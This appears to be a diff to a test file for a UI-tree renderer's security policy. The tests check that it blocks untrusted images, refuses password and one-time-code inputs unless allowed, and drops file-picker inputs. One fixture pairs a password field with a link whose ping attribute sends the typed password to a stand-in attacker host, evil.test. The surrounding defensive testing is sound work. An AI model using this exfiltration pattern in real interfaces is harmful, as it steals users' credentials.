@@ -254,7 +254,7 @@ describe("images", () => {
           },
         ],
       },
-      { adapters: { allowImageUrl }, data: { people: [{ name: "Ada", src: "https://cdn.example.test/ada.png" }, { name: "Eve", src: "https://evil.test/eve.png" }] } },
+      { policy: { allowImageUrl }, data: { people: [{ name: "Ada", src: "https://cdn.example.test/ada.png" }, { name: "Eve", src: "https://evil.test/eve.png" }] } },
     );
     const images = [...view.container.querySelectorAll("img")];
     expect(images.map((img) => img.getAttribute("src"))).toEqual([
@@ -355,9 +355,44 @@ describe("sensitive components", () => {
   });
 
   it("renders them when the host allows that name", () => {
-    renderTree(doc, { allowSensitive: ["PasswordInput"] });
+    renderTree(doc, { policy: { allowSensitive: ["PasswordInput"] } });
     expect(queryDiagnostics()).toEqual([]);
     expect(screen.getByLabelText("Password")).toBeInTheDocument();
+  });
+
+  it("refuses a control a value turns into one asking for a secret, $ref spellings included", () => {
+    // The exploit: a password field beside a link that would carry what is typed elsewhere.
+    const view = renderTree(
+      {
+        component: "Stack",
+        children: [
+          { component: "Field", props: { name: "pw" }, children: [{ component: "Field.Label", children: ["Confirm your password"] }, { component: "Input", props: { type: "password", autoComplete: "current-password" } }] },
+          { component: "Input", props: { "aria-label": "Code", autoComplete: { $ref: "data.otp" } } },
+          { component: "Link", props: { href: "/help", ping: { $concat: ["https://evil.test/p?pw=", { $ref: "forms.f.values.pw" }] } }, children: ["Help"] },
+        ],
+      },
+      { data: { otp: "one-time-code" } },
+    );
+    expect(view.container.querySelector("input")).toBeNull();
+    expect(queryDiagnostics().map(({ code, path }) => [code, path])).toEqual([
+      ["sensitive-component", "/root/children/0/children/1/props/type"],
+      ["sensitive-component", "/root/children/1/props/autoComplete"],
+    ]);
+    expect(screen.getByRole("link", { name: "Help" })).not.toHaveAttribute("ping");
+  });
+
+  it("renders such a control when the host allows the component", () => {
+    renderTree({ component: "Input", props: { "aria-label": "Secret", type: "password" } }, { policy: { allowSensitive: ["Input"] } });
+    expect(queryDiagnostics()).toEqual([]);
+    expect(screen.getByLabelText("Secret")).toHaveAttribute("type", "password");
+  });
+});
+
+describe("refused values", () => {
+  it("drops an Input type outside the contract's set (a file picker), as the validator says", () => {
+    const view = renderTree({ component: "Input", props: { "aria-label": "Upload", type: { $ref: "data.kind" } } }, { data: { kind: "file" } });
+    expect(screen.getByLabelText("Upload")).not.toHaveAttribute("type", "file");
+    expect(view.issuesOf("invalid-prop-value")).toEqual([["/root/props/type", false]]);
   });
 });
 
@@ -374,7 +409,7 @@ describe("dropped contract props", () => {
     expect(own.container.querySelector("img")).toBeNull();
     expect(own.issuesOf("forbidden-prop")).toEqual([["/root/props/imageAllowlist", false]]);
     own.unmount();
-    const hosted = renderTree({ component: "Markdown", children: [source] }, { env: { markdownImageAllowlist: ["/assets/"] } });
+    const hosted = renderTree({ component: "Markdown", children: [source] }, { policy: { markdownImages: ["/assets/"] } });
     expect(hosted.container.querySelector("img")).toHaveAttribute("src", "/assets/diagram.png");
   });
 });
